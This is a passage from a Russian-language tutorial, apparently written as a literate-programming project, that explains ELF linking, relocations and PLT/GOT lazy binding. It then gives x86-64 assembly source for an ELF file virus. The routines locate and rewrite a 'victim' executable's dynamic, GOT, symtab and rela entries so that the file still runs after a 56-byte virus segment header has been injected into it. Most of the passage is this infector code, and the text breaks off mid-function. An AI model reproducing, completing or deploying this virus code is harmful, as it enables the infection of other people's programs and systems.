  000000601068  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
  000000601070  000300000007 R_X86_64_JUMP_SLO 0000000000000000 asctime@GLIBC_2.2.5 + 0
  000000601078  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
  000000601080  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
  000000601088  000700000007 R_X86_64_JUMP_SLO 0000000000000000 time@GLIBC_2.2.5 + 0
#+END_SRC

Из всех этапов компиляции нас интересует только два: кодогенерация и
линковка. На этапе кодогенерации генерируется весь код и проверяется
наличие определения (объекта) для всех используемых символов. Определения
могут находиться и за пределами текущего файла, и тогда мы будем их
искать в указанных библиотеках с помощью таблицы символов в них.  Если же
не найдем и там, то компиляция не завершится.

На выходе из этого этапа мы получаем объектный файл.
Распечатав такой файл с помощью objdump-a мы видим, что в нем не хватает секции .plt и
.got, .dynamic и многих других. Это происходит, потому что
заключительного этапа компиляции - линковки - еще не было.

Давайте взглянем на таблицу символов:

#+BEGIN_SRC sh
  $ gcc hello.c -hello.o
  $ readelf -s hello.o

  Таблица символов «.symtab» содержит 17 элементов:
     Чис:    Знач           Разм Тип     Связ   Vis      Индекс имени
       0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
       1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.c
       2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1
       3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3
       4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4
       5: 0000000000000000     0 SECTION LOCAL  DEFAULT    5
       6: 0000000000000000     0 SECTION LOCAL  DEFAULT    7
       7: 0000000000000000     0 SECTION LOCAL  DEFAULT    8
       8: 0000000000000000     0 SECTION LOCAL  DEFAULT    6
       9: 0000000000000008     8 OBJECT  GLOBAL DEFAULT  COM rawtime
      10: 0000000000000008     8 OBJECT  GLOBAL DEFAULT  COM timeinfo
      11: 0000000000000000    81 FUNC    GLOBAL DEFAULT    1 main
      12: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND puts
      13: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND time
      14: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND localtime
      15: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND asctime
      16: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND printf
#+END_SRC

Во-первых, она очень короткая, потому что многие символы еще не
подключены. А во вторых, в поле "значение", в котором должен находиться
адрес символа или его смещение в файле, пусто. Линковки еще не было,
поэтому ссылки на символы все еще не заполнены.

А теперь  посмотрим на секции rela.

#+BEGIN_SRC sh
  $ readelf -r hello.o

  Раздел перемещения '.rela.text' со смещением 0x310 содержит 11 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000000005  00050000000a R_X86_64_32       0000000000000000 .rodata + 0
  00000000000a  000c00000002 R_X86_64_PC32     0000000000000000 puts - 4
  00000000000f  00090000000a R_X86_64_32       0000000000000008 rawtime + 0
  000000000014  000d00000002 R_X86_64_PC32     0000000000000000 time - 4
  000000000019  00090000000a R_X86_64_32       0000000000000008 rawtime + 0
  00000000001e  000e00000002 R_X86_64_PC32     0000000000000000 localtime - 4
  000000000025  000a00000002 R_X86_64_PC32     0000000000000008 timeinfo - 4
  00000000002c  000a00000002 R_X86_64_PC32     0000000000000008 timeinfo - 4
  000000000034  000f00000002 R_X86_64_PC32     0000000000000000 asctime - 4
  00000000003c  00050000000a R_X86_64_32       0000000000000000 .rodata + 10
  000000000046  001000000002 R_X86_64_PC32     0000000000000000 printf - 4

  Раздел перемещения '.rela.eh_frame' со смещением 0x418 содержит 1 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000000020  000200000002 R_X86_64_PC32     0000000000000000 .text + 0
#+END_SRC

Поле "смещение" действительно указывает на смещение в файле, а не на
виртуальный адрес, куда мы положим новый адрес релокейта.

Что ж, завершим нашу компиляцию, превратив объектный файл в
исполняемый. На этом этапе включается линкер, который должен заполнить
все ссылки, какие сможет. Но есть ссылки, которые он заполнить не
сможет. Это происходит, потому что на этом этапе линкер не имеет никакого
представления о том, куда будут загружены библиотеки, и потому оставляет
эти ссылки нетронутыми до исполнения программы, где уже включится
известным нам механизм ленивого связывания, которое осуществляется с
помощью PLT и GOT.

Благодаря им и магии виртуальной памяти мы можем загрузить библиотеку
один раз и разделить ее между несколькими программами, и для каждой она
будет как будто лежать по разным адресам.

Но так было далеко не всегда. Когда PLT и GOT не было, процесс выглядел
по-другому. Помимо того, что для каждого процесса приходилось отдельно
подгружать библиотеку, отличался процесс линковки.
На этапе компиляции линкер предполагал, что библиотеки будут размещены
примерно сразу за стеком и вписывал смещение от текущей инструкции до
предполагаемого адреса кода библиотеки, который был нужен. А затем
рантайм линкер во время исполнения программы получал базовый адрес
загруженной библиотеки и складывал этот адрес с посчитанным ранее
смещением и таким образом вызывался необходимый код.

Именно из-за этого процесса релокейты так называются. Фактически у нас
есть символ и есть ссылка на его объект - определение. До исполнения программы
ссылка указывает в одно место, а во время исполнения начинает указывать в
другое место. Т.е. мы перемещаем саму ссылку на объект.

Теперь же мы используем PLT и GOT. Посмотрите на виртуальные адреса
релокейтов в секциях rela.

#+BEGIN_SRC sh
  $ readelf -r hello

  Раздел перемещения '.rela.dyn' со смещением 0x438 содержит 1 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601040  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

  Раздел перемещения '.rela.plt' со смещением 0x450 содержит 6 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601060  000100000007 R_X86_64_JUMP_SLO 0000000000000000 localtime@GLIBC_2.2.5 + 0
  000000601068  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
  000000601070  000300000007 R_X86_64_JUMP_SLO 0000000000000000 asctime@GLIBC_2.2.5 + 0
  000000601078  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
  000000601080  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
  000000601088  000700000007 R_X86_64_JUMP_SLO 0000000000000000 time@GLIBC_2.2.5 + 0
#+END_SRC

И взгляните, на какие именно записи в GOT прыгает PLT.

#+BEGIN_SRC sh
  0000000000400508 <localtime@plt-0x10>:
    400508:	ff 35 32 0b 20 00    	pushq  0x200b32(%rip)        # 601040 <_DYNAMIC+0x1e0>
    40050e:	ff 25 34 0b 20 00    	jmpq   *0x200b34(%rip)        # 601048 <_GLOBAL_OFFSET_TABLE_>
    400514:	0f 1f 40 00          	nopl   0x0(%rax)

  0000000000400518 <localtime@plt>:
    400518:	ff 25 32 0b 20 00    	jmpq   *0x200b32(%rip)        # 601050 <_GLOBAL_OFFSET_TABLE_+0x8>
    40051e:	68 00 00 00 00       	pushq  $0x0
    400523:	e9 e0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400528 <puts@plt>:
    400528:	ff 25 2a 0b 20 00    	jmpq   *0x200b2a(%rip)        # 601058 <_GLOBAL_OFFSET_TABLE_+0x10>
    40052e:	68 01 00 00 00       	pushq  $0x1
    400533:	e9 d0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400538 <asctime@plt>:
    400538:	ff 25 22 0b 20 00    	jmpq   *0x200b22(%rip)        # 601060 <_GLOBAL_OFFSET_TABLE_+0x18>
    40053e:	68 02 00 00 00       	pushq  $0x2
    400543:	e9 c0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400548 <printf@plt>:
    400548:	ff 25 1a 0b 20 00    	jmpq   *0x200b1a(%rip)        # 601068 <_GLOBAL_OFFSET_TABLE_+0x20>
    40054e:	68 03 00 00 00       	pushq  $0x3
    400553:	e9 b0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400558 <__libc_start_main@plt>:
    400558:	ff 25 12 0b 20 00    	jmpq   *0x200b12(%rip)        # 601070 <_GLOBAL_OFFSET_TABLE_+0x28>
    40055e:	68 04 00 00 00       	pushq  $0x4
    400563:	e9 a0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400568 <time@plt>:
    400568:	ff 25 0a 0b 20 00    	jmpq   *0x200b0a(%rip)        # 601078 <_GLOBAL_OFFSET_TABLE_+0x30>
    40056e:	68 05 00 00 00       	pushq  $0x5
    400573:	e9 90 ff ff ff       	jmpq   400508 <_init+0x28>
#+END_SRC

Эти адреса совпадают с виртуальными адресами релокейтов из секций
rela. Суть механизма осталась прежней, просто PLT и GOT позволяют
оптимизировать подкгрузку библиотек.

Сначала ссылки на релокейты  содержат в себе адрес кода в PLT, который
вызовет линкер, а после рантайм линковки будут содержать в себе адрес,
по которому лежит библиотечный код.

Но как в деталях происходит этот процесс?

Теперь, когда мы скомпилировали файл, мы можем его запустить и проследить
весь путь работы линкера.

Загружая файл, загрузчик должен какм-то образом понять, какие библиотеки
ему загружать. Но вся фишка в том, что все, что он загружает - это сам
файл и линкер, чье имя оказано в сегмента INTERP. Затем управление
переходит на линкер, и вот он уже осуществляет всю работу по подгрузке
библиотек.

Первым делом линкер отправляется в секцию dynamic и ищет в ней записи,
помеченные как NEEDED. Эти записи содержат в себе имена библиотек, от
которых зависят все прочие библиотеки. Они будут загружены в первую
очередь.

После этого линкер отправляется в strtab - таблицу строк - и считывает
оттуда пути, по которым ищет остальные библиотеки. Найдя их, линкер
загружает их в память.

Следующий этап - это связывание библиотек друг с другом. Происходит это
рекурсивно: линкер заходит в секцию dynamic каждой библиотеки и ищет в
ней запись NEEDED. Если такая запись есть, то линкер отправляется в
библиотеку, указанную в этой записи, читает ее секцию dynamic и т.д. Это
продолжается до тех пор, пока не будет найдены библиотеки, не зависящие
от прочих. Линкер разрешит все ссылки сначала в них, а затем, откатываясь
назад по дереву рекурсии, будет разрешать ссылки в прочих библиотеках.

Линкер знает, что скорее всего его вызовут еще n раз, а еще знает, что скорее
всего будет вызвана libc, которой нужен доступ к некоторым секциям
жертвы, вроже секций fini или init, информация о которых хранится в
любимой нами секции dynamic. Но вот обращаться напрямую к записям
dynamic повторно линкер не хочет, да и libc это незачем.

Поэтому после того, как линкер свяжет все библиотеки друг с другом, он
создает в памяти буфер и сохраняет адреса необходимых ему и libc
записей dynamic - т.е. где эти записи расположены в памяти
процесса. Это позволит ему и libc обращаться к конкретным записям
dynamic, а не прочесывать ее всю каждый раз. Адрес этого буфера будет
положен в одну и записей GOT, а в другую запись линкер положит свой
собственный адрес, чтоб мы могли вызвать его из PLT. После чего
управление переходит на саму программу.

Внутри программы, когда мы натыкаемся на первый вызов какой-то
библиотечной функции, PLT вызывает линкер снова. Линкер читает имя
символа, который должен быть связан, а затем читает записьиз секции rela,
в которой описано, как именно должен быть связан этот символ. Затем
отправляется в библиотеку, где лежит этот символ, и просматривает ее
таблицу символов. Если символ найден, то линкер считывает смещение, по
которому лежит определение этого символа в библиотеке, складвает его с
базовым адресом и полученный адрес вписывает в запись GOT, которая
ассоциирована с этим символом. Именно так выполняется процесс релокации,
описанный выше. После этого линкер возвращает управление нашей программе.

Теперь, когда мы понимаем этот сложный процесс в деталях, нам становится
очевидно, почему инфицированный ELF работает некорректно.
Добавив новый заголовок, мы сместили весь код мишени на 56 байт. Но
проблема в том, что секции symtab, rela, dynamic и got, чьеи записи
содержат адрес кода в PLT, вызывающего линкер, ничего об этом не
знают. Адреса и смещения, записанные в их записях, больше
неактуальны. Поэтому линкер получается совершенно не ту информацию, на
которую рассчитывает.

Чтобы это исправить, нужно отредактировать каждую запись в этих трех
секциях, увеличив смещение и/или адрес, записанные в них, на размер
заголовока сегмента вируса.

* Редактируем got, symtab, rela и dynamic

Секции symtab, rela и dynamic достаточно просто найти.
У нас есть таблица заголовков секций. В каждом заголовке секции есть поле
sh_type, которое обозначает, секцию какого типа описывает этот заголовок. Не у каждой
секции есть свой специфический тип, но у rela, symtab и dynamic этот типа
есть. Секции rela имеют тип 4, секция symtab - тип 2, секция dynamic -
тип 4. Найдя заголовок интересущей вас секции, считайте ее смещение от
начала файла, а затем сложите это смещение с базовым адресом вашей
загруженной в память мишени. Так вы найдете, где секции располагаются в
памяти.

Поскольку записи в этих секциях фиксированного размера, то вы можете
просто сдвигать указатель на определенное количество байт и таким образом
редактировать нужные вам поля.

[TODO:gmm] Если так вышло, что у вас нет заголовков секций вообще, то вы можете
сначала найти секцию dynamic по заголовку ее сегмента. Вы вычислите адрес
секции dynamic уже указанным способом и считаете оттуда записи секции
rela, symtab и got и получаете адреса этих сегментов. Затем вы берете
виртуальный адрес первого сегмента и вычитаете его из каждого полученного
виртуального адреса. Так вы получите смещение в файле для rela и symtab,
затем сложите их с базовым адресом ELF-a и получите адреса секций в
памяти.

** Ищем секцию dynamic

Просто проходимся циклом по заголовкам секций и ищем заголовок с
типом 6. Если он есть, то сохраняем виртуальный адрес, размер и
смещение. Они нам понадобятся для разных вычислений в будущем.
А чтоб иметь доступ к секции всегда, вычислим сразу ее адрес в памяти,
слов ее смещение и базовый адрес ELF-a.

#+NAME: _find_dynamic
#+BEGIN_SRC asm
  /// _FIND_DYNAMIC
  /// Ищет заголовок секции dynamic
  /// Если находит, то заполняет данные о секции
  _find_dynamic:
      push    %rcx
      push    %rdx
      push    %rdi

      mov     victim_shdr_table_addr(%rip), %rdi
      mov     victim_shdr_amount(%rip), %rcx

      test   %rdi, %rdi
      je      _find_dynamic_fail

      test   %rcx, %rcx
      je     _find_dynamic_fail

  _find_dynamic_cycle:
      mov     SHDR_SH_TYPE(%rdi), %rdx
      cmp     $0x6, %dl   # shdr = dynamic?
      je      _find_dynamic_success

      add     $0x40, %rdi
      loop    _find_dynamic_cycle
      jmp     _find_dynamic_fail

  _find_dynamic_success:
      mov     SHDR_SH_ADDR(%rdi), %rdx
      mov     %rdx, dynamic_records_vaddr(%rip)   # dynamic sh_vaddr

      mov     SHDR_SH_OFFSET(%rdi), %rdx
      mov     %rdx, dynamic_records_offset(%rip)   # dynamic sh_offset

      mov     victim_elf_addr(%rip), %rcx
      add     %rdx, %rcx
      mov     %rcx, dynamic_records_addr(%rip)

      mov     SHDR_SH_SIZE(%rdi), %rdx
      mov     %rdx, dynamic_records_size(%rip)   # dynamic size

      xor     %rax, %rax
      jmp     _find_dynamic_exit

  _find_dynamic_fail:
      mov     $-1, %rax

  _find_dynamic_exit:
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Поиск секции ~dynamic~ скорее относится к этапу парсинга мишени, так что
добавим вызов этой функции в ~parse_victim~:

#+NAME: _call_find_dynamic
#+BEGIN_SRC asm :noweb yes
        call     _find_dynamic
        test    %rax, %rax
        jne      _get_victim_code

#+END_SRC

[[_parse_victim][_parse_victim]]

** Редактируем секцию dynamic

Теперь посмотрим, как отредактировать эту секцию. Как мы уже видели
ранее, в записи секции содержат в себе не только адреса, по которым можно
найти те или иные секции кода, но и размеры этих секций или размеры
записей в них. А нам надо отредактировать только адреса, а размеры не
трогать.

Как же отделить одно от другого? Довольно просто: у нас есть виртуальный
адрес начала ELF-файла - он же виртуальный адрес первого LOAD-сегмента.
Никакой адрес в ELF-e не может быть меньше него.
И можно было бы сравнивать каждый адрес из записи ~dynamic~ с ним и все,
что меньше  не редактировать. Но бывает так, что виртуальный адрес равен
нулю. Это случается, если ваш ELF имеет тип DYN - динамически
разделяемый. Тогда сравнивать с адресом первого LOAD-сегмента не имеет
смысла.

Поэтому мы посчитаем адрес кода мишени, который начинается сразу после
таблицы заголовков сегментов. Он уж точно не будет нулевым.

Для этого возьмем адрес первого LOAD-сегмента, сложим его с размером
таблицы сегментов и размером ELF-заголовка.

#+NAME: _count_victim_code_begin_vaddr
#+BEGIN_SRC asm
  /// _COUNT_VICTIM_CODE_BEGIN_VADDR
  /// считает виртуальный адрес кода жертвы
  _count_victim_code_begin_vaddr:
      push    %rdx
      push    %rdi
      push    %rsi

      mov    victim_code_offset(%rip), %rdx
      test    %rdx, %rdx
      je     _count_victim_code_begin_vaddr_fail

      mov    first_seg_vaddr(%rip), %rdi
      add    %rdx, %rdi

      leaq   victim_code_frm_begin_vaddr(%rip), %rsi
      mov    %rdi, (%rsi)
      xor    %rax, %rax
      jmp     _count_victim_code_begin_vaddr_exit

  _count_victim_code_begin_vaddr_fail:
      mov     $-1, %rax

  _count_victim_code_begin_vaddr_exit:
      pop    %rsi
      pop    %rdi
      pop    %rdx
      ret
#+END_SRC


А теперь будем каждый адрес в записи секции ~dynamic~ сравнивать с этим
адресом. Если меньше - не редактируем.

Поскольку неизвестно, сколько записей в секции - это записит от формата
файла - но известно, что каждая запись занимает 0x10 байт, то мы возьмем
размер секции и поделим его на 0x10.

#+NAME: _recount_dynamic_section
#+BEGIN_SRC asm :noweb yes
  /// _RECOUNT_DYNAMIC_SECTION
  /// редактирует vaddr кода, описываемого записями в dynamic,
  /// а так же находит запись GOT и сохраняет ее измененный vaddr
  _recount_dynamic_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %r9
      push    %rdi
      push    %rsi

      mov     dynamic_records_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _recount_dynamic_section_fail

      mov     dynamic_records_size(%rip), %rdx
      test    %rdx, %rdx
      je      _recount_dynamic_section_fail

      mov     dynamic_records_vaddr(%rip), %r9
      test    %r9, %r9
      je      _recount_dynamic_section_fail

      mov     victim_code_frm_begin_vaddr(%rip), %r8
      test    %r8, %r8
      je      _recount_dynamic_section_fail

      // считаем количество записей
      mov     %edx, %eax
      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx
      mov     %eax, %ecx

      mov     %r8, %rdx
      mov     %rdi, %rax

      <<_add_bind_now_to_dynamic1>>
      mov     constant_value(%rip), %rsi
  _recount_dynamic_section_cycle:
      // запись FLAGS_1?
      cmpq    $0x6ffffffb, (%rax)
      jne     _recount_vaddr
      jmp     _skip_record

  _skip_record:
      add     $0x8, %rax
      jmp     _recount_dynamic_section_next_iter

  _recount_vaddr:
      add     $0x8, %rax  # пропустили тип

      cmp     %rdx,  (%rax)
      jle     _recount_dynamic_section_next_iter

      <<_add_bind_now_to_dynamic2>>

  _add_const:
      // vaddr релокейта + константа
      add     %rsi, (%rax)

  _recount_dynamic_section_next_iter:
      add     $0x8, %rax    # сдвиг на след. запись
      loop    _recount_dynamic_section_cycle

  _recount_dynamic_section_success:
      xor     %rax, %rax
      jmp     _recount_dynamic_section_exit

  _recount_dynamic_section_fail:
      mov     $-1, %rax

  _recount_dynamic_section_exit:
      pop     %rsi
      pop     %rdi
      pop     %r9
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Вызовем эту функцию из ~recount_victim~:

#+NAME: _call_recount_dynamic_section
#+BEGIN_SRC asm :noweb yes
        call    _recount_dynamic_section
        test    %rax, %rax
        jne     _generate_virus_data
#+END_SRC

[[_recount_victim][_recount_victim]]

** Ищем секцию got

С секцией got чуть сложнее. Ее заголовок имеет тип 1, а с этим типом есть
множество заголовокв секций. Но есть секция, которая которая ссылкается на секцию
~got~ - это секция ~dynamic~, как мы знаем. Запись о секции got имеет тип 3 в
секции dynamic и этот тип уникален. Поскольку мы теперь знаем, где
находится dynamic в памяти, мы можем пройтись по ней и найти запись о
секции got и сохранить ее виртуальный адрес.

#+NAME: _find_got_section_vaddr
#+BEGIN_SRC asm
  /// _FIND_GOT_SECTION
  /// Ищет запись GOT в секции dynamic
  /// и сохраняет виртуальный адрес секции
  /// GOT, если находит запись о ней
  _find_got_section_vaddr:
      push    %rcx
      push    %rdx
      push    %rdi

      // проверяем данные
      mov     dynamic_records_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_got_section_vaddr_fail

      mov     dynamic_records_size(%rip), %rax
      test    %rax, %rax
      je      _find_got_section_vaddr_fail

      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx

      mov     %eax, %ecx  # количество записей
      mov     %rdi, %rsi

  _find_got_section_vaddr_cycle:
      cmpl     $0x3, (%rdi)
      je      _find_got_section_vaddr_success

      add     $0x10,%rdi
      loop    _find_got_section_vaddr_cycle
      jmp     _find_got_section_vaddr_fail

  _find_got_section_vaddr_success:
      add     $0x8, %rdi
      mov     (%rdi), %rax
      mov     %rax, GOT_vaddr(%rip)

      xor     %rax, %rax
      jmp     _find_got_section_vaddr_exit

  _find_got_section_vaddr_fail:
      mov     $-1, %rax

  _find_got_section_vaddr_exit:
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Вызовем этот поиск из функции ~parse_victim~, поскольку это напрямую
относится к парсингу жертвы:

#+NAME: _call_find_got_section_vaddr
#+BEGIN_SRC asm
        call    _find_got_section_vaddr
        test    %rax, %rax
        jne     _get_victim_code
#+END_SRC

[[_parse_victim][_parse_victim]]

Зная виртуальный адрес секции, можно пройтись по заголовкам секций и
найти, у какого заголовка виртуальный адрес такой же. Это и будет
заголовок ~got~. Найдя этот зголовок, считаем из него  смещение, сложим
его с базовым адресом эльфа и получим адрес секции got в
памяти. Так же сохраним размер секции - это поможет высчитать количество
записей в ней.

#+NAME: _find_got_section_im_memory
#+BEGIN_SRC asm
  /// _FIND_GOT_SECTION_IM_MEMORY
  /// высчитывает адрес секции GOT
  /// в памяти и ее размер
  _find_got_section_im_memory:
      push    %rdx
      push    %rcx
      push    %rdi
      push    %rsi

      // проверяем данные
      mov     victim_elf_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _find_got_section_im_memory_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_got_section_im_memory_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_got_section_im_memory_fail

      mov     GOT_vaddr(%rip), %rdx
      test    %rdx, %rdx
      je      _find_got_section_im_memory_fail

  _find_got_section_im_memory_cycle:
      cmp     %rdx, SHDR_SH_ADDR(%rdi)
      je      _find_got_section_im_memory_success

      add     $0x40, %rdi

      loop    _find_got_section_im_memory_cycle
      jmp     _find_got_section_im_memory_fail

  _find_got_section_im_memory_success:
      mov     SHDR_SH_OFFSET(%rdi), %rcx
      add     %rcx, %rsi
      mov     %rsi, GOT_addr_in_memory(%rip)

      mov     SHDR_SH_SIZE(%rdi), %rcx
      mov     %rcx, GOT_size(%rip)

      xor     %rax, %rax
      jmp     _find_got_section_im_memory_exit

  _find_got_section_im_memory_fail:
      mov     $-1, %rax

  _find_got_section_im_memory_exit:
      pop     %rsi
      pop     %rdi
      pop     %rcx
      pop     %rdx
      ret
#+END_SRC

Поскольку поиск адреса секции вполне укладывается в понятие парсинга, то
и эту функцию вызовем из ~parse_victim~:

#+NAME: _call_find_got_section_im_memory
#+BEGIN_SRC asm :noweb yes
      call    _find_got_section_im_memory

#+END_SRC

[[_parse_victim][_parse_victim]]

** Редактируем got

Найдя, где лежит секция ~got~, ее можно отредактировать. Мы не знаем,
сколько в ней записей, но знаем, что каждая запись - это 8 байт. Далее
вычислим количество записей, как это делали с секцией ~dynamic~.

Редактируем любой адрес, который больше нуля.

#+NAME: _recount_got_section
#+BEGIN_SRC asm :noweb yes
  /// _RECOUNT_GOT_SECTION
  /// редактирует записи - адреса
  /// - внутри GOT, увеличивая их на
  /// на заданную величину
  _recount_got_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8

      mov     GOT_size(%rip), %rax
      test    %rax, %rax
      je      _recount_got_section_fail

      mov     GOT_addr_in_memory(%rip), %rbx
      test    %rbx, %rbx
      je      _recount_got_section_fail

      mov     dynamic_records_vaddr(%rip), %r8
      test    %r8, %r8
      je      _recount_got_section_fail

      // посчитали кол-во записей
      // в секции got
      xor     %rdx, %rdx
      mov     $0x8, %ecx
      idiv    %ecx
      mov     %eax, %ecx

      mov     %rbx, %rax
      mov     $0x38, %rbx

      <<_add_bind_now_to_got_records1>>
  _recount_got_section_cycle:
      cmp     $0, (%rax)
      je      _recount_got_next_iter

      <<_add_bind_now_to_got_records2>>

  _add_const_to_got_record:
      // vaddr записи + константа
      add     %rbx, (%rax)

  _recount_got_next_iter:
      add     $0x8, %rax   # сдвиг на след. запись
      loop    _recount_got_section_cycle

      xor     %rax, %rax
      jmp     _recount_got_section_exit

  _recount_got_section_fail:
      mov     $-1, %rax

  _recount_got_section_exit:
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Вызовем эту функцию из ~recount_victim~:

#+NAME: _call_recount_got_section
#+BEGIN_SRC asm :noweb yes
      call    _recount_got_section
#+END_SRC

[[_recount_victim][_recount_victim]]

** Ищем symtab

Посик ~symtab~ ничем не отличается от поиска ~dynamic~: просто теперь
ищем заголовок с типом 2, а не типом 6 в таблице заголовков секций.

#+NAME: _find_symtab
#+BEGIN_SRC asm
  /// FIND_SYMTAB_CODE
  /// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
  /// таблицу символов. Ищем по типу заголовка -
  /// у symtab этот тип 2, symtab может быть
  /// в файле в единственном числе
  /// PARAMS:
  _find_symtab:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_symtab_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_symtab_fail

  _find_symtab_cycle:
      mov     %rdi, %rsi
      mov     SHDR_SH_TYPE(%rdi), %rdx

      cmp     $0x2, %rdx   # shdr = symtab?
      je      _find_symtab_success

      add     $0x40, %rsi
      mov     %rsi, %rdi
      loop    _find_symtab_cycle

  _find_symtab_success:
      leaq    symtab_shdr_addr(%rip), %rdi
      mov     %rsi,  (%rdi)

      // считаем кол-во записией в symtab
      // symtab size / symtab record size = rec. amount
      mov      SHDR_SH_SIZE(%rsi), %rdx
      mov      $0x18, %ecx
      movl     %edx, %eax
      xor      %rdx, %rdx
      idivl    %ecx

      leaq    symtab_records_amount(%rip), %rdi
      mov     %rax, (%rdi)

      xor     %rax, %rax
      jmp     _find_symtab_exit

  _find_symtab_fail:
      mov     $-1, %rax

  _find_symtab_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Поиск ~.symtab~ вполне можно отнести к парсингу жертвы. Так что этот
функционал будем вызывать из ~parse_victim~:

#+NAME: _call_find_symtab
#+BEGIN_SRC asm :noweb yes
        call    _find_symtab
        test    %rax, %rax
        jne     _parse_victim_fail

#+END_SRC

** Редактируем symtab

Просто движемся от записи к записи и увеличиваем адрес в ней на 56 байт,
если он не равен нулю.

#+NAME: _recount_symbols_addrs
#+BEGIN_SRC asm :noweb yes
  /// _RECOUNT_SYMBOLS_ADDRS
  /// Редактирует vaddr символов
  _recount_symbols_addrs:
      push     %rcx
      push     %rbx
      push     %rdx
      push     %r8
      push     %rdi
      push     %rsi

      // проверяем необходимые данные
      mov     symtab_shdr_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _recount_symbols_addrs_fail

      mov     symtab_records_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _recount_symbols_addrs_fail

      mov     victim_elf_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _recount_symbols_addrs_fail

      mov     dynamic_records_vaddr(%rip), %r8

      // указатель на первую запись в symtab
      add     $0x18, %rdi
      add     (%rdi), %rsi
      mov     %rsi, %rdi

      // константа, на которую увеличиваются
      // виртуальные адреса
      mov     $0x38, %rdx
      <<_add_bind_now_to_symtab1>>

  _recount_symbols_addrs_cycle:
      add     $0x8, %rdi   # offset до vaddr символа

      cmp     $0, (%rdi)
      je      _recount_symbols_next_iter

      <<_add_bind_now_to_symtab2>>
  _add_const_symtab:
      add     %rdx, (%rdi)  # сместили на разм. virus phdr

  _recount_symbols_next_iter:
      add     $0x10, %rdi
      loop    _recount_symbols_addrs_cycle

      xor     %rax, %rax
      jmp     _recount_symbols_addrs_exit

  _recount_symbols_addrs_fail:
      mov    $-1, %rax

  _recount_symbols_addrs_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rdx
      pop     %rbx
      pop     %rcx
      ret

#+END_SRC

Вызовем эту функцию из ~_recount_victim~:

#+NAME: _call_recount_symbols_addrs
#+BEGIN_SRC asm :noweb yes
        call    _recount_symbols_addrs
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

** Ищем и редактируем rela

С секциями ~rela~ все немного интереснее: их может быть несколько в
файле. Поэтому проще редактировать их, как только нашел, а не выуживать
данные о каждой.

Все просто: проходмся по загоовокам секций. Если тип №4 - это заголовок
секции ~rela~. Тогда считаем адрес этой секции в памяти - смещение +
базовый адрес ELF-a в памяти - и вызываем редактирование секции. А потом
продолжаем искать следующую.

Вот как это вышлядит:
#+NAME: _recount_rela_sections
#+BEGIN_SRC asm :noweb yes
  /// _RECOUNT_RELA_SECTIONS
  /// Находит все секции типа rela
  /// и вызывает их пересчитывание
  _recount_rela_sections:
      push  %rbx
      push  %rdx
      push  %rcx

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _recount_rela_sections_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je     _recount_rela_sections_fail

  _recount_rela_sections_cycle:
      add     $0x4, %rdx        # проверяем тип
      cmp     $0x4, (%rdx)      # тип rela?
      jne     _recount_rela_sections_next

      sub     $0x4, %rdx
      mov     SHDR_SH_OFFSET(%rdx), %rbx
      mov     %rbx, rela_section_offset(%rip)

      mov     SHDR_SH_SIZE(%rdx), %rbx
